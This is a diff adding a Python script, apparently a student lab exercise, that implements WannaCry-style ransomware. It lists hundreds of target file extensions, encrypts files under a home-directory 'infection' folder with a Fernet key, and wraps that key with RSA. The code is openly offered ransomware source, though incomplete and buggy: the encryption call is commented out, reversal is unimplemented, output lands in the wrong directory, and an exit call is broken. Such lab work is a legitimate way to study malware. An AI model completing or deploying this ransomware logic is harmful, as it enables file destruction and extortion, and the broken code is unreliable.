@@ -1,0 +1,125 @@
+#!/goinfre/alvgomez/miniconda3/envs/42cyber-alvgomez/bin/python
+
+import argparse
+import os
+from OpenSSL import crypto
+from cryptography.fernet import Fernet
+from Crypto.PublicKey import RSA
+from Crypto.Random import get_random_bytes
+from Crypto.Cipher import PKCS1_v1_5
+
+version = "1.0.0"
+
+wannacry_extensions = ['.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw', '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb', '.mdb', '.db', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln', '.suo', '.cs', '.c', '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', '.ps1', '.vbs', '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp', '.rb', '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla', '.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi', '.mov', '.mp4', '.3gp', '.mkv', '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg', '.ai', '.psd', '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png', '.bmp', '.jpg', '.jpeg', '.vcd', '.iso', '.backup', '.zip', '.rar', '.7z', '.gz', '.tgz', '.tar', '.bak', '.tbk', '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm', '.sldx', '.sti', '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1', '.wks', '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb', '.eml', '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps', '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc']
+
+def parse_arguments():
+    parser = argparse.ArgumentParser(description="Wannacry infection, it will encrypt all files in the infection folder of the HOME directory")
+    parser.add_argument("-g", action="store_true", dest="gen", help="Generate key pair")
+    parser.add_argument("-v", action="store_true", dest="version", help="Show the version of the program")
+    parser.add_argument("-r", action="store_true", dest="reverse", help="Reverse infection")
+    parser.add_argument("-s", action="store_true", dest="silent", help="Program won't show any output")
+    arg = parser.parse_args()
+    if arg.gen is True and (arg.version is True or arg.reverse is True or arg.silent is True):
+        raise parser.error("-g option should be exclusive")
+    if arg.version is True and (arg.gen is True or arg.reverse is True or arg.silent is True):
+        raise parser.error("-r option should be exclusive")
+    return arg
+
+class wannacry:
+    def __init__(self, args):
+        self.silent = args.silent
+
+    def asymetric_encrypt(self, msg, public_key):
+        cipher = PKCS1_v1_5.new(public_key)
+        emsg = cipher.encrypt(msg)
+        return emsg
+
+    def asymetric_decrypt(self, emsg, private_key):
+        sentinel = get_random_bytes(16)
+        cipher = PKCS1_v1_5.new(private_key)
+        dmsg = cipher.decrypt(emsg, sentinel)
+        return dmsg.decode()
+    
+    def symetric_encrypt(self, file_path, file_name, key, extensions):
+        try:
+            if os.path.splitext(file_path)[1] in extensions:
+                with open(file_path, 'rb') as f:
+                    data = f.read()
+                fernet = Fernet(key)
+                data_enc = fernet.encrypt(data)
+                with open(f'{file_name}.ft', 'wb') as f:
+                    f.write(data_enc)
+            else:
+                print(f"{file_name} NOT encrypted")
+        except:
+            pass
+
+    def symetric_decrypt(self, key_enc, key):
+        fernet = Fernet(key)
+        key_dec = fernet.decrypt(key_enc)
+        return key_dec
+
+    def generate_key_pair(self, ):
+        key = RSA.generate(2048)
+        public_key = key.publickey()
+        private_key_pem = key.export_key()
+        public_key_pem = public_key.export_key()
+        with open('private_key.pem', 'wb') as f:
+            f.write(private_key_pem)
+        with open('public_key.pem', 'wb') as f:
+            f.write(public_key_pem)
+        #print("Keys saved successfully.")
+
+    def wannacry_encryption(self, dir_path, key, extensions):
+        try: 
+            files = os.listdir(dir_path)
+            for file_name in files:
+                file_path = os.path.join(dir_path, file_name)
+                if os.path.isfile(file_path):
+                    #self.symetric_encrypt(file_path, file_name, key, extensions)
+                    print(f"encrypt {file_name}")
+                elif os.path.isdir(file_path):
+                    self.wannacry_encryption(file_path, key, extensions)
+                else:
+                    print("Could not encrypt")
+        except:
+            pass
+
+if __name__ == "__main__":
+    args = parse_arguments()
+    wc = wannacry(args)
+    
+    if args.gen is True:
+       wc.generate_key_pair()
+       exit()
+    if args.version is True:
+       print(f"stockholm: v{version}")
+       exit
+
+    home = os.path.expanduser("~")
+    infection = os.path.join(home, "infection")
+    if os.path.isdir(infection) is not True:
+        print("'infection' folder does not exist")
+        exit()
+
+    if args.reverse is False:
+        symetric_key = Fernet.generate_key()
+        wc.wannacry_encryption(infection, symetric_key, wannacry_extensions)
+        try:
+            with open("public_key.pem", 'rb') as f:
+                public_key = RSA.import_key(f.read())
+            symetric_key_encrypted = wc.asymetric_encrypt(symetric_key, public_key)
+            with open(os.path.join(infection, 'key_encrypted.ft'), 'wb') as f:
+                f.write(symetric_key_encrypted)
+        except:
+            with open(os.path.join(infection, 'key_not_encrypted.ft'), 'wb') as f:
+                f.write(symetric_key)
+    else:
+        print("reverse")
+
+    
+
+    
+    
+
+    
